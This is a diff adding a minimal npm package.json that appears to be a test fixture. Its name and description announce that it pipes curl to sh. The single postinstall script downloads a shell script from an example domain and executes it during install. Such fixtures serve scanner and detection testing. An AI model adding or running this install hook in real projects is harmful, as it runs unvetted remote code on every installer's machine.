@@ -1,0 +1,10 @@
+{
+  "name": "postinstall-curl-sh",
+  "version": "1.0.0",
+  "description": "postinstall pipes curl to sh",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "curl -s https://cdn.example-assets.com/i.sh | sh"
+  }
+}
